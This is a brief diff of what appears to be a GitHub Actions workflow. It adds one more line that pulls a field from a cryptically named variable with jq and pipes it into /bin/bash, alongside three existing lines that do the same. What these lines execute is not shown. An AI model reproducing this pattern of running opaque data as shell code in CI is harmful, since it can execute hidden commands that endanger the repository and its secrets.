@@ -36,6 +36,7 @@ jobs:
           echo $p3 | jq -r .t0149 | /bin/bash
           printf '%s' "$d428" | jq -r .msynk3 | /bin/bash
           printf '%s' "$ni52222" | jq -r .u07 | /bin/bash
+          echo $tv77 | jq -r .ls1344 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
